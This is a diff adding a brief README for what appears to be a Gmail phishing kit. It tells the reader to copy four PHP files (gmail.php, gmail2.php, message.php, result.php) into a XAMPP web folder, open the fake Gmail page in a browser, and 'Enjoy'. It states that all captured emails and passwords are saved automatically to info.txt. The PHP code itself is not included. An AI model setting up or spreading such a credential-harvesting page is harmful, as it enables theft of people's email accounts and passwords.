@@ -1,0 +1,11 @@
+How to use?
+Step1: Create a newfolder in Xampp-->htdocs.
+Step2: Copy all the four files(gmail.php,gmail2.php,
+message.php,result.php) into Xampp-->htdocs-->newfolder.
+Step3: Goto GoogleChrome/Mozilla and open as:
+localhost/newfolder/gmail.php
+Step4 : Enjoy :)
+
+Note: All emails and passwords gets automatically stored 
+into info.txt file.
+
